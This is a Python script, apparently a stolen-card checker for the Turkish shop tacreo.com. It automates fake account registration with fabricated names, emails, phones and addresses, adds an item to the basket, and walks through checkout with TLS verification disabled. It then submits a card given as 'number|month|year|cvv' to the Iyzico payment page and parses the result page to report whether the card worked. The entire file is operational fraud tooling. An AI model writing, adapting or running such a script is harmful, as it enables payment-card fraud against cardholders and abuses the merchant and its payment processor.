import requests, re, time, json, random, sys, urllib.parse, urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

SESSION = requests.Session()
SESSION.verify = False
BASE = 'https://www.tacreo.com'
SERVICE = 'https://service.farktor.com'
CCODE = '55002201'

try:
    sys.stdout.reconfigure(encoding='utf-8')
except:
    pass

HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Accept': '*/*', 'Accept-Language': 'tr-TR,tr;q=0.7',
    'Origin': BASE, 'Referer': BASE + '/',
    'X-Requested-With': 'XMLHttpRequest', 'Sec-GPC': '1',
}

UID = f'{int(time.time()*1000)}-{random.randint(1,9999)}-{random.randint(1,9999)}-{random.randint(1,999999)}-{random.randint(1,9999)}'
SESSION_ID = str(random.randint(100000, 999999))

COOKIE_BASE = {
    'device': '0', 'setCOUNTRY': 'TR', 'setLANGUAGE': 'TR',
    'setCURRENCY': 'TL', 'setCURR': '1', 'setDIFFERENCE': '1',
    'isBROWSER': 'Chrome', 'isPC': 'windows',
    f'{CCODE}UID': UID, f'{CCODE}sessionId': SESSION_ID,
}

def uc(resp):
    for k, v in resp.cookies.items():
        COOKIE_BASE[k] = v

def req(method, url, data=None, headers=None):
    h = dict(HEADERS)
    if headers: h.update(headers)
    if data:
        h['Content-Type'] = 'application/x-www-form-urlencoded; charset=UTF-8'
        data = urllib.parse.urlencode(data) if isinstance(data, dict) else data
    SESSION.cookies.update(COOKIE_BASE)
    r = (SESSION.get if method.upper() == 'GET' else SESSION.post)(url, headers=h, data=data)
    r.encoding = 'utf-8'
    uc(r)
    return r

GA = lambda: str(int(time.time() * 1000))

def parse_result(html):
    title = ''; bank = ''
    m = re.search(r'<div\s+class=["\']T["\'][^>]*>\s*(.*?)\s*<', html)
    if m: title = m.group(1).strip()
    m = re.search(r'<div\s+class=["\']sT["\'][^>]*>(.*?)</div>', html, re.DOTALL)
    if m:
        sub = m.group(1)
        m2 = re.search(r'<strong>(.*?)</strong>', sub)
        if m2:
            bank = m2.group(1).strip()
        if not bank:
            bank = re.sub(r'<[^>]+>', '', sub).strip().rstrip(':').strip()
    return title, bank

def log(t):
    try:
        sys.stdout.buffer.write((str(t) + '\n').encode('utf-8'))
        sys.stdout.buffer.flush()
    except:
        try: print(t)
        except: pass

def add_to_basket():
    return req('POST', f'{SERVICE}/services/stock/get/member-basket',
               data=f'fCode=Fr-5500220&x_AddBagSeries=1&sessionId={SESSION_ID}',
               headers={'Sec-Fetch-Site': 'cross-site'})

def bag_add_product(pid='147608'):
    return req('POST', f'{BASE}/Library/Query/Bag.asp?I=2', data={
        'PRODUCT_ID': pid, 'NAV_ID': '0', 'NAV_NAME': '',
        'DESIGN_PRODUCT': '0', 'DESIGN_PRODUCT_DATA': '',
        'RM_POSITION': 'null', 'RM_LIST': 'null',
        'RM_NAME': 'Yar\u0131m \u00c7orap', 'RM_ID': 'null',
        'RM_PRICE': '99.99', 'RM_CATEGORY': 'null', 'RM_VARIANT': 'null',
    })

def bag_op(i):
    return req('POST' if i != 'get' else 'GET', f'{BASE}/Library/Query/Bag.asp?I={i}')

def register():
    rs = random.randint(10000, 99999)
    return req('POST', f'{BASE}/Library/Query/Login.asp?I=2', data={
        'registerName': 'mustafa', 'registerSurname': 'mustafa',
        'registerEmail': f'user{rs}@mail.com',
        'registerPhone': f'0(5{random.randint(30,55)}) {random.randint(100,999)} {random.randint(10,99)} {random.randint(10,99)}',
        'registerPassword': '123BANEBANE', 'registerContract1': '1',
    })

def page(p):
    h = {'Accept': 'text/html,*/*;q=0.8', 'Sec-Fetch-Dest': 'document', 'Upgrade-Insecure-Requests': '1'}
    return req('GET', f'{BASE}/{p}', headers=h)

def checkout(i, data=None):
    return req('POST', f'{BASE}/Library/Query/Checkout.asp?I={i}', data=data or {})

def addition(t=None):
    return req('POST', f'{BASE}/Library/Modul/12000610/Addition.asp?Page=Payment&T={t or GA()}')

def address(i, data=None):
    return req('POST', f'{BASE}/Library/Query/Address.asp?I={i}', data=data or {})

def set_shipping(cargo_id='50'):
    return req('POST', f'{BASE}/Library/Query/?I=2', data={
        'FCODE': 'Fr-5500220', 'SCODE': 'Fr-5500220-1',
        'SID': SESSION_ID, 'MID': COOKIE_BASE.get(f'{CCODE}memberId', ''),
        'MHID': 'null', 'SHID': 'null', 'CARGO_ID': cargo_id,
    })

def submit_card(card_number, month, year, cvv, order_id):
    return req('POST', f'{BASE}/Page/Checkout/Payment/Bank/Iyzico.asp?pth=1', data={
        'formCreditCardName': '', 'formCreditCardNumber': card_number,
        'formCreditCardM': month, 'formCreditCardY': year,
        'formCreditCardCVV': cvv, 'formCreditCardOrderID': order_id,
        'CreditCardNumber': card_number, 'rewardName': '', 'rewardValue': '',
        'rewardActive': 'false', 'formSaveCard': '0', 'CardItem': '0',
        'masterCardName': '', 'masterSaveCart': '0',
    })

def parse_cc(raw):
    parts = raw.strip().split('|')
    cc, ay, yil, cvv = [p.strip() for p in parts[:4]]
    if len(yil) == 2: yil = '20' + yil
    return cc, ay, yil, cvv

def full_flow(card_number=None, month=None, year=None, cvv=None):
    if not card_number:
        if len(sys.argv) > 1:
            card_number, month, year, cvv = parse_cc(sys.argv[1])
        else:
            card_number, month, year, cvv = parse_cc(input('CC: '))
    log(f'[1] session: {SESSION_ID}')

    add_to_basket(); bag_add_product(); bag_op('26'); page('sepet')

    r = register()
    mid = COOKIE_BASE.get(f'{CCODE}memberId', '?')
    log(f'[2] uye: {mid}')

    page('sepet'); page('odeme'); checkout('1', {'PAYMENT_TYPE': '1'})
    address('101', {'CITY_ID': '104605'})
    address('102', {'TYPE': '1', 'ORDER_ID': '0', 'ADDRESS_ID': '0',
        'FORM_FIRSTNAME': 'mustafa', 'FORM_LASTNAME': 'mustafa',
        'FORM_PHONE': '0(533) 649 56 78', 'FORM_CITY': '104605',
        'FORM_TOWN': '104607', 'FORM_DETAIL': '- bilecik genc',
        'FORM_TITLE': 'Ev', 'FORM_CORPORATE': 'undefined',
        'FORM_CORPORATE_STATUS': '0', 'FORM_INVOICE_TYPE': '1',
        'FORM_TAX_NAME': '', 'FORM_TAX_ID': '', 'FORM_INVOICE_NAME': '',
        'FORM_TOWN_TEXT': '', 'FORM_ZIP_CODE': '', 'FORM_PHONE_COUNTRY': '',
        'FORM_PHONE_CODE': '',
    })
    page('odeme')

    set_shipping(); page('odeme')

    addition()
    order_id = '5666147'
    m = re.search(r'formCreditCardOrderID[^=]*=[^"\']*["\']?(\d+)', addition().text)
    if m: order_id = m.group(1)

    checkout('13', {'INSTALLMENT': '1', 'EXTRA_INS': '0', 'MATURITY': '0',
        'BANK_ID': '23', 'BANK_CODE': '59', 'PROVIDER': '250',
        'PROVIDER_CODE': 'Iyzico', 'CARD_ID': '3', 'CARD_CODE': 'bonus',
        'CARD_NAME': 'BONUS'})
    addition()
    checkout('13', {'INSTALLMENT': '1', 'EXTRA_INS': '0', 'MATURITY': '0',
        'BANK_ID': '23', 'BANK_CODE': '59', 'PROVIDER': '250',
        'PROVIDER_CODE': 'Iyzico', 'CARD_ID': '3', 'CARD_CODE': 'bonus',
        'CARD_NAME': 'BONUS'})
    bag_op('3')

    r = req('POST', f'{BASE}/Library/Query/Order.asp?I=1', data={'PAYMENT_TYPE': '1'})
    m = re.search(r'(\d{5,10})', r.text)
    if m: order_id = m.group(1)
    log(f'[3] order: {order_id}')

    log(f'[4] kart: {card_number[:6]}...{card_number[-4:]}')
    card_resp = submit_card(card_number, month, year, cvv, order_id)

    result_resp = page('basarisiz')
    durum, hata = parse_result(result_resp.text)

    if 'basarisiz' in durum.lower() or 'ba\u015farisiz' in durum.lower():
        log(f'[5] BASARISIZ: {hata}')
    elif 'basarili' in durum.lower() or 'ba\u015farili' in durum.lower():
        log(f'[5] BASARILI')
    else:
        log(f'[5] {durum}: {hata}' if hata else f'[5] {durum}')

    return {'status': durum, 'bank_error': hata, 'order_id': order_id}

if __name__ == '__main__':
    result = full_flow()
    log(f'\nSONUC: {result}')
